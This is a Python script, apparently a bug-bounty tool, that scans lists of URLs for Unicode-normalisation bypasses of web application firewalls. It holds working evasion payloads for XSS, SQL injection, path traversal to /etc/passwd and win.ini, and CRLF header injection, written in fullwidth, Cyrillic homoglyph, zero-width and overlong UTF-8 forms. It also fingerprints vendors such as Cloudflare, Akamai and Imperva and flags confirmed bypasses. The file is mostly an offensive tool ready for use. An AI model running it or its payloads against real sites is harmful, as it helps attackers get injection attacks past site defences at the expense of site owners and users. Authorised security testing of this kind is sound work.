#!/usr/bin/env python3
"""
unicode_bypass.py — Unicode Normalization WAF Bypass Scanner
Tests parameters with fullwidth, homoglyph, combining-character, and
overlong-encoded payloads that pass WAF inspection but get normalized
to dangerous characters by backend servers.

Technique: Send a standard attack payload and confirm WAF blocks it,
then send the Unicode variant. If the Unicode variant passes through
(and reflects/executes), the WAF bypass is confirmed.

Categories: Fullwidth XSS, Fullwidth SQLi, Fullwidth path traversal,
overlong UTF-8 CRLF, Cyrillic homoglyphs, combining/zero-width chars.

Usage:
  python3 unicode_bypass.py -i urls.txt -o findings.txt -t 10
  python3 unicode_bypass.py -i urls.txt --dry-run
"""

import argparse
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlunparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_UA = "noleak"
DEFAULT_TIMEOUT = 10

# ── WAF detection patterns ──────────────────────────────────────────

WAF_BLOCK_STATUS = {403, 406}

WAF_BLOCK_BODY_PATTERNS = [
    re.compile(p, re.I) for p in (
        r"access\s+denied",
        r"blocked",
        r"request\s+rejected",
        r"web\s+application\s+firewall",
        r"cloudflare",
        r"akamai\s+ghost",
        r"akamai",
        r"imperva\s+incapsula",
        r"imperva",
        r"datadome",
        r"sucuri",
        r"f5\s+big-?ip",
        r"mod_security|modsecurity",
        r"barracuda",
        r"fortiweb",
        r"<title>403 Forbidden</title>",
        r"the\s+requested\s+url\s+was\s+rejected",
        r"your\s+request\s+has\s+been\s+blocked",
    )
]

WAF_FINGERPRINT_HEADERS = {
    "server": [
        (r"cloudflare", "Cloudflare"),
        (r"akamaighost", "Akamai"),
        (r"sucuri", "Sucuri"),
    ],
    "x-powered-by": [
        (r"datadome", "DataDome"),
    ],
}

# ── Fullwidth Unicode character map ─────────────────────────────────

FW = {
    "<": "\uff1c", ">": "\uff1e", "'": "\uff07", '"': "\uff02",
    "(": "\uff08", ")": "\uff09", "/": "\uff0f", "\\": "\uff3c",
    ".": "\uff0e", "=": "\uff1d", ";": "\uff1b", "|": "\uff5c",
    " ": "\u3000",
    # Fullwidth letters/digits used in SQLi keywords
    "O": "\uff2f", "R": "\uff32", "U": "\uff35", "N": "\uff2e",
    "I": "\uff29", "S": "\uff33", "E": "\uff25", "L": "\uff2c",
    "C": "\uff23", "T": "\uff34",
    "1": "\uff11", "0": "\uff10",
}

# ── Payload categories ──────────────────────────────────────────────
# Each tuple: (standard_payload, unicode_payload, category, description)

PAYLOADS = []

# --- a. Fullwidth Unicode XSS ---
PAYLOADS += [
    (
        "<script>alert(1)</script>",
        f"{FW['<']}script{FW['>']}alert{FW['(']}1{FW[')']}{FW['<']}/script{FW['>']}",
        "XSS", "FULLWIDTH_SCRIPT"
    ),
    (
        "<img src=x onerror=alert(1)>",
        f"{FW['<']}img src{FW['=']}x onerror{FW['=']}alert{FW['(']}1{FW[')']}{FW['>']}",
        "XSS", "FULLWIDTH_IMG"
    ),
    (
        "<svg onload=alert(1)>",
        f"{FW['<']}svg onload{FW['=']}alert{FW['(']}1{FW[')']}{FW['>']}",
        "XSS", "FULLWIDTH_SVG"
    ),
]

# --- b. Fullwidth Unicode SQLi ---
PAYLOADS += [
    (
        "' OR '1'='1",
        f"{FW[chr(39)]}{FW[' ']}{FW['O']}{FW['R']}{FW[' ']}{FW[chr(39)]}{FW['1']}{FW[chr(39)]}{FW['=']}{FW[chr(39)]}{FW['1']}",
        "SQLI", "FULLWIDTH_OR"
    ),
    (
        "' UNION SELECT NULL--",
        f"{FW[chr(39)]}{FW[' ']}{FW['U']}{FW['N']}{FW['I']}{FW['O']}{FW['N']}{FW[' ']}{FW['S']}{FW['E']}{FW['L']}{FW['E']}{FW['C']}{FW['T']}{FW[' ']}{FW['N']}{FW['U']}{FW['L']}{FW['L']}--",
        "SQLI", "FULLWIDTH_UNION"
    ),
    (
        "1 OR 1=1--",
        f"{FW['1']}{FW[' ']}{FW['O']}{FW['R']}{FW[' ']}{FW['1']}{FW['=']}{FW['1']}--",
        "SQLI", "FULLWIDTH_NUMERIC_OR"
    ),
]

# --- c. Fullwidth Path Traversal ---
PAYLOADS += [
    (
        "../../../etc/passwd",
        f"{FW['.']}{FW['.']}{FW['/']}{FW['.']}{FW['.']}{FW['/']}{FW['.']}{FW['.']}{FW['/']}etc{FW['/']}passwd",
        "PATH", "FULLWIDTH_DOTSLASH"
    ),
    (
        "..\\..\\windows\\win.ini",
        f"{FW['.']}{FW['.']}{FW[chr(92)]}{FW['.']}{FW['.']}{FW[chr(92)]}windows{FW[chr(92)]}win{FW['.']}ini",
        "PATH", "FULLWIDTH_BACKSLASH_WIN"
    ),
]

# --- d. CRLF via overlong UTF-8 ---
PAYLOADS += [
    (
        "%0d%0aX-Injected: true",
        "%E5%98%8A%E5%98%8DX-Injected: true",
        "CRLF", "OVERLONG_UTF8_CRLF"
    ),
    (
        "%0d%0aSet-Cookie: evil=1",
        "%E5%98%8A%E5%98%8DSet-Cookie: evil=1",
        "CRLF", "OVERLONG_UTF8_SETCOOKIE"
    ),
]

# --- e. Homoglyph bypass (Cyrillic lookalikes) ---
# Cyrillic: а=0430  с=0441  е=0435  о=043e  р=0440  ѕ=0455  х=0445  у=0443
PAYLOADS += [
    (
        "<script>alert(1)</script>",
        "<\u0455\u0441ri\u0440t>alert(1)</\u0455\u0441ri\u0440t>",
        "XSS", "HOMOGLYPH_SCRIPT"
    ),
    (
        "javascript:alert(1)",
        "j\u0430v\u0430\u0455\u0441ri\u0440t:\u0430l\u0435rt(1)",
        "XSS", "HOMOGLYPH_JAVASCRIPT"
    ),
]

# --- f. Combining character / zero-width bypass ---
ZWJ = "\u200b"  # zero-width space
PAYLOADS += [
    (
        "<script>alert(1)</script>",
        f"<scr{ZWJ}ipt>alert(1)</scr{ZWJ}ipt>",
        "XSS", "ZEROWIDTH_SCRIPT"
    ),
    (
        "' OR '1'='1",
        f"' O{ZWJ}R '1'='1",
        "SQLI", "ZEROWIDTH_OR"
    ),
    (
        "<script>alert(1)</script>",
        "<scr\u0336ipt>alert(1)</scr\u0336ipt>",
        "XSS", "COMBINING_STRIKETHROUGH"
    ),
]

# ── Detection helpers ───────────────────────────────────────────────

XSS_REFLECTED_PATTERNS = [
    re.compile(r"<script[^>]*>alert\(1\)</script>", re.I),
    re.compile(r"onerror\s*=\s*alert", re.I),
    re.compile(r"onload\s*=\s*alert", re.I),
    re.compile(r"javascript\s*:\s*alert", re.I),
]

SQLI_ERROR_PATTERNS = [
    re.compile(r"(SQL\s*syntax|mysql|ORA-\d{4,5}|PG::SyntaxError)", re.I),
    re.compile(r"(syntax\s+error.*near|unclosed\s+quotation|unterminated\s+string)", re.I),
    re.compile(r"(microsoft\s+ole\s+db|ODBC\s+SQL\s+Server\s+Driver)", re.I),
    re.compile(r"(UNION\s+ALL\s+SELECT|ORDER\s+BY\s+\d)", re.I),
]

PATH_SUCCESS_PATTERNS = [
    re.compile(r"root:x?:\d+:\d+:"),
    re.compile(r"\[extensions\]"),
    re.compile(r"\[fonts\]"),
]


def _is_html_context(body, payload_fragment):
    """Check if payload appears inside an HTML-executable context (not JSON/attribute)."""
    idx = body.find(payload_fragment)
    if idx == -1:
        return False
    # Check surrounding context is not inside a JSON blob or script type="application/json"
    before = body[max(0, idx - 200):idx].lower()
    if 'application/json' in before or '"type":"' in before:
        return False
    return True


# ── Core scanning logic ────────────────────────────────────────────

class UnicodeBypassScanner:
    def __init__(self, user_agent=DEFAULT_UA, timeout=DEFAULT_TIMEOUT):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": user_agent})
        self.session.verify = False
        self.timeout = timeout
        self.lock = threading.Lock()

    def _request(self, url):
        """Send GET and return (status, body, headers_dict) or (None, "", {})."""
        try:
            resp = self.session.get(url, allow_redirects=True, timeout=self.timeout)
            return resp.status_code, resp.text, dict(resp.headers)
        except requests.RequestException:
            return None, "", {}

    def _is_waf_blocked(self, status, body):
        """Determine if the response indicates a WAF block."""
        if status in WAF_BLOCK_STATUS:
            return True
        for pat in WAF_BLOCK_BODY_PATTERNS:
            if pat.search(body):
                return True
        return False

    def _identify_waf(self, headers, body):
        """Try to identify the WAF product from response."""
        server = headers.get("server", "").lower()
        for pattern, name in [
            (r"cloudflare", "Cloudflare"), (r"akamaighost", "Akamai"),
            (r"sucuri", "Sucuri"), (r"imperva", "Imperva"),
        ]:
            if re.search(pattern, server, re.I):
                return name
        body_lower = body.lower()
        for pattern, name in [
            (r"cloudflare", "Cloudflare"), (r"datadome", "DataDome"),
            (r"imperva", "Imperva"), (r"akamai", "Akamai"),
            (r"barracuda", "Barracuda"), (r"mod_security", "ModSecurity"),
            (r"f5\s+big-?ip", "F5 BIG-IP"), (r"fortiweb", "FortiWeb"),
        ]:
            if re.search(pattern, body_lower):
                return name
        return "Unknown"

    def _inject_param(self, url, param, payload):
        """Replace a query parameter value with the payload."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if param not in params:
            return None
        params[param] = [payload]
        flat = {k: v[0] for k, v in params.items()}
        new_query = "&".join(f"{k}={v}" for k, v in flat.items())
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                           parsed.params, new_query, parsed.fragment))

    def _get_params(self, url):
        """Extract query parameter names."""
        parsed = urlparse(url)
        return list(parse_qs(parsed.query, keep_blank_values=True).keys())

    def _get_baseline(self, url, param):
        """Fetch a clean baseline response for later comparison."""
        baseline_url = self._inject_param(url, param, "bb_baseline_test_99")
        if not baseline_url:
            return None, "", {}
        return self._request(baseline_url)

    def test_param(self, url, param):
        """Test one URL+param through all Unicode payload categories."""
        findings = []

        # Get baseline for SQLi differential detection
        base_status, base_body, _ = self._get_baseline(url, param)
        base_len = len(base_body) if base_body else 0

        for std_payload, uni_payload, category, desc in PAYLOADS:

            # Step 1: Send standard payload — confirm WAF blocks it
            std_url = self._inject_param(url, param, std_payload)
            if not std_url:
                continue
            std_status, std_body, std_headers = self._request(std_url)
            if std_status is None:
                continue

            if not self._is_waf_blocked(std_status, std_body):
                continue  # WAF did not block standard payload — nothing to bypass

            waf_product = self._identify_waf(std_headers, std_body)

            # Step 2: Send Unicode variant — check if it passes
            uni_url = self._inject_param(url, param, uni_payload)
            if not uni_url:
                continue
            uni_status, uni_body, uni_headers = self._request(uni_url)
            if uni_status is None:
                continue

            if self._is_waf_blocked(uni_status, uni_body):
                continue  # Unicode variant also blocked

            # Step 3: Classify the bypass by category
            finding = self._classify(
                url, param, category, desc,
                std_status, uni_status, uni_body,
                waf_product, std_payload, uni_payload,
                base_body, base_len,
            )
            if finding:
                findings.append(finding)

        return findings

    def _classify(self, url, param, category, desc,
                  std_status, uni_status, uni_body,
                  waf_product, std_payload, uni_payload,
                  base_body, base_len):
        """Determine severity and build output line."""
        tag = f"{desc}"
        waf_note = f"waf={waf_product}"
        blocked_note = f"standard_blocked={std_status}"
        bypass_note = f"unicode_passed={uni_status}"
        payload_note = f"std=[{std_payload}] uni=[{uni_payload}]"

        if category == "XSS":
            reflected = any(p.search(uni_body) for p in XSS_REFLECTED_PATTERNS)
            if reflected and _is_html_context(uni_body, "alert"):
                return (
                    f"[P1:UNICODE_BYPASS:CRIT] {tag} | {url} | param={param} | "
                    f"XSS reflected+executable in HTML context | "
                    f"{blocked_note} {bypass_note} {waf_note} | {payload_note}"
                )
            elif reflected:
                return (
                    f"[P2:UNICODE_BYPASS:HIGH] {tag} | {url} | param={param} | "
                    f"XSS reflected but context unconfirmed | "
                    f"{blocked_note} {bypass_note} {waf_note} | {payload_note}"
                )
            else:
                return (
                    f"[P3:UNICODE_BYPASS:MEDIUM] {tag} | {url} | param={param} | "
                    f"WAF bypassed but payload not reflected | "
                    f"{blocked_note} {bypass_note} {waf_note} | {payload_note}"
                )

        elif category == "SQLI":
            sql_error = any(p.search(uni_body) for p in SQLI_ERROR_PATTERNS)
            # Differential: compare response length to baseline
            len_diff = abs(len(uni_body) - base_len)
            response_changed = (len_diff > 200) or (base_body and uni_body != base_body and len_diff > 50)

            if sql_error:
                return (
                    f"[P1:UNICODE_BYPASS:HIGH] {tag} | {url} | param={param} | "
                    f"SQLi error confirmed via Unicode bypass | "
                    f"{blocked_note} {bypass_note} {waf_note} | {payload_note}"
                )
            elif response_changed:
                return (
                    f"[P2:UNICODE_BYPASS:HIGH] {tag} | {url} | param={param} | "
                    f"Response differs from baseline (delta={len_diff}b) | "
                    f"{blocked_note} {bypass_note} {waf_note} | {payload_note}"
                )
            else:
                return (
                    f"[P3:UNICODE_BYPASS:MEDIUM] {tag} | {url} | param={param} | "
                    f"WAF bypassed but no SQL error/diff detected | "
                    f"{blocked_note} {bypass_note} {waf_note} | {payload_note}"
                )

        elif category == "PATH":
            file_read = any(p.search(uni_body) for p in PATH_SUCCESS_PATTERNS)
            if file_read:
                return (
                    f"[P1:UNICODE_BYPASS:HIGH] {tag} | {url} | param={param} | "
                    f"File read confirmed via Unicode path traversal | "
                    f"{blocked_note} {bypass_note} {waf_note} | {payload_note}"
                )
            else:
                return (
                    f"[P3:UNICODE_BYPASS:MEDIUM] {tag} | {url} | param={param} | "
                    f"WAF bypassed for path traversal payload | "
                    f"{blocked_note} {bypass_note} {waf_note} | {payload_note}"
                )

        elif category == "CRLF":
            header_injected = "x-injected" in uni_body.lower() or "set-cookie: evil" in uni_body.lower()
            if header_injected:
                return (
                    f"[P2:UNICODE_BYPASS:HIGH] {tag} | {url} | param={param} | "
                    f"CRLF header injection confirmed via overlong UTF-8 | "
                    f"{blocked_note} {bypass_note} {waf_note} | {payload_note}"
                )
            else:
                return (
                    f"[P3:UNICODE_BYPASS:MEDIUM] {tag} | {url} | param={param} | "
                    f"WAF bypassed for CRLF payload | "
                    f"{blocked_note} {bypass_note} {waf_note} | {payload_note}"
                )

        return None

    def test_url(self, url):
        """Test all query parameters in a URL."""
        all_findings = []
        params = self._get_params(url)
        if not params:
            return all_findings
        for param in params:
            all_findings.extend(self.test_param(url, param))
        return all_findings


# ── Main ────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Unicode Normalization WAF Bypass Scanner"
    )
    parser.add_argument("-i", "--input", required=True, help="Input file with URLs")
    parser.add_argument("-o", "--output", required=False, help="Output file for findings")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Thread count (default: 10)")
    parser.add_argument("--max-urls", type=int, default=2000, help="Max URLs to test")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Request timeout (default: 10)")
    parser.add_argument("--dry-run", action="store_true", help="Show targets without testing")
    parser.add_argument("--user-agent", default=DEFAULT_UA, help="User-Agent header")
    args = parser.parse_args()

    try:
        with open(args.input, "r") as f:
            raw_urls = [line.strip() for line in f
                        if line.strip() and line.strip().startswith("http")]
    except (IOError, PermissionError) as e:
        print(f"[ERROR] Cannot read input: {e}", file=sys.stderr)
        sys.exit(1)

    if not raw_urls:
        print("[*] No URLs to test")
        return

    # Pre-filter: only URLs with query params, skip static assets
    skip_ext = re.compile(
        r"\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|"
        r"pdf|zip|tar|gz|mp4|mp3|webp|avif)(\?|$)", re.I
    )
    urls = [u for u in raw_urls if "?" in u and not skip_ext.search(u)]

    # Deduplicate by host+path
    seen = set()
    deduped = []
    for url in urls:
        p = urlparse(url)
        key = f"{p.netloc}{p.path}"
        if key not in seen:
            seen.add(key)
            deduped.append(url)
    urls = deduped[:args.max_urls]

    print(f"[*] Loaded {len(raw_urls)} raw URLs, filtered to {len(urls)} parameterized URLs")

    if args.dry_run:
        for url in urls:
            print(f"[DRY-RUN] {url}")
        return

    scanner = UnicodeBypassScanner(user_agent=args.user_agent, timeout=args.timeout)
    lock = threading.Lock()
    completed = [0]
    all_findings = []

    def process_url(url):
        findings = scanner.test_url(url)
        with lock:
            completed[0] += 1
            if completed[0] % 25 == 0 or findings:
                print(f"[*] Progress: {completed[0]}/{len(urls)} URLs tested")
            for f in findings:
                print(f"  {f}")
                all_findings.append(f)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(process_url, url): url for url in urls}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"  [ERROR] {futures[future]}: {e}")

    if args.output and all_findings:
        try:
            with open(args.output, "w") as f:
                for line in all_findings:
                    f.write(line + "\n")
            print(f"\n[*] Wrote {len(all_findings)} finding(s) to {args.output}")
        except (IOError, PermissionError) as e:
            print(f"[ERROR] Cannot write output: {e}", file=sys.stderr)

    print(f"\n[*] Scan complete: {len(urls)} URLs, {len(all_findings)} findings")


if __name__ == "__main__":
    main()
